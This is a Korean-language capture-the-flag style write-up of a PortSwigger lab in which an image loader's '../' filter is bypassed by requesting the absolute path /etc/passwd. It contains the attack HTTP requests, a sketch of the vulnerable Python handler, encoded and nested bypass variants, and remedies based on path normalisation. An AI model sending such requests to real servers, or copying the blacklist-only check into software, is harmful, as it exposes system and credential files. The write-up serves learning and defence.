# Lab: File path traversal, traversal sequences blocked with absolute path bypass

## 개요

- **난이도**: Practitioner
- **주제**: Path Traversal — `../` 차단 우회 / 절대 경로(Absolute Path) 이용
- **링크**: https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass

## 목표

상품 이미지 로더가 `../` 같은 순회 시퀀스를 차단하지만, 입력을 기본 작업 디렉토리 기준의 상대경로로 처리한다는 점을 악용해 절대 경로 `/etc/passwd` 로 임의 파일을 읽는다.

## 이전 랩(001)과의 차이

```
[001 — simple case]
  방어 없음
  → ../../../etc/passwd 로 상위 탈출

[002 — absolute path bypass (이번)]
  "../" 시퀀스 차단 (문자열 필터)
  → 대신 절대 경로 "/etc/passwd" 를 그대로 전달
  → 차단 로직은 상대경로 탈출만 고려, 절대경로는 검증하지 않음
```

핵심: **`../` 만 막는 것은 불충분하다.** 입력이 상대경로인지 절대경로인지에 대한
검증이 없으면 절대경로로 동일한 결과를 얻을 수 있다.

## 취약 지점

```http
GET /image?filename=21.jpg HTTP/1.1
              ↑
       기본 작업 디렉토리 기준 상대경로로 처리되는 파라미터
```

서버 내부 처리 (추정):

```python
filename = request.args.get("filename")

# ../ 차단 (블랙리스트)
if "../" in filename or "..\\" in filename:
    return "Blocked", 400

# 절대경로 검증 없이 그대로 사용
with open(filename, "rb") as f:   # 상대경로면 CWD 기준, 절대경로면 그대로
    return f.read()
```

`open()` 에 절대경로를 넘기면 기준 디렉토리와 무관하게 해당 경로를 그대로 연다.

## 공격 단계

### 1단계 — 이미지 요청 캡처

```http
GET /image?filename=21.jpg HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

### 2단계 — `../` 차단 확인

```http
GET /image?filename=../../../etc/passwd HTTP/1.1
→ 400 Bad Request (또는 차단 응답)
```

### 3단계 — 절대 경로로 우회

```http
GET /image?filename=/etc/passwd HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

### 4단계 — 응답 확인

`/etc/passwd` 내용이 그대로 반환되면 랩 해결.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

## 차단 우회 관점 정리

```
[필터가 막는 것]
  "../", "..\\" 시퀀스

[필터가 놓치는 것]
  절대 경로 (/etc/passwd)
  → 경로 순회 없이도 루트에서 바로 접근 가능

[시사점]
  "../" 블랙리스트는 "상대경로 탈출" 만 방어
  절대경로·심볼릭 링크·인코딩 변형은 별도 검증 필요
```

## 방어

```
[잘못된 방어 — 이번 랩의 취약점]
  if "../" in filename: 차단
  → 절대경로, 인코딩(%2e%2e%2f), 중첩(....//) 등으로 우회 가능

[올바른 방어]
  1. 경로 정규화 후 기준 디렉토리 내부인지 확인
     import os
     base = os.path.realpath("/var/www/images")
     target = os.path.realpath(os.path.join(base, user_input))
     if not target.startswith(base + os.sep):
         raise ValueError("허용되지 않은 경로")

  2. 경로 구분자를 아예 제거하고 파일명만 허용
     filename = os.path.basename(user_input)

  3. 파일명을 ID 로 매핑해 목록에 있는 값만 허용 (화이트리스트)

[주의]
  os.path.join(base, "/etc/passwd") 는 두 번째 인자가 절대경로라
  base 를 무시하고 "/etc/passwd" 를 반환한다.
  → join 결과를 반드시 realpath 로 정규화한 뒤 base 포함 여부를 검사해야 함
```

## 핵심 정리

- `../` 시퀀스 차단만으로는 부족하며, 절대 경로 `/etc/passwd` 를 그대로 넣어 우회했다.
- 입력을 기본 작업 디렉토리 기준 상대경로로 처리하면서 절대경로 검증이 없을 때 발생한다.
- `os.path.join(base, user_input)` 도 `user_input` 이 절대경로면 `base` 를 무시하므로 정규화 후 기준 디렉토리 검사가 필수다.
- 블랙리스트(`../` 차단)는 인코딩·중첩·절대경로 등 변형에 취약하므로 화이트리스트/정규화 검증을 사용해야 한다.

## 배운 점

- 001 이 "`../` 로 탈출" 이라면, 002 는 "`../` 를 막아도 절대경로라는 우회로가 남는다" 는 점을 보여준다.
- 차단 로직은 항상 "무엇을 막는가" 보다 "무엇을 놓치는가" 를 기준으로 평가해야 한다.
- 경로 검증은 차단(블랙리스트)이 아니라 정규화 + 기준 디렉토리 포함 여부(화이트리스트)로 수행해야 안전하다.
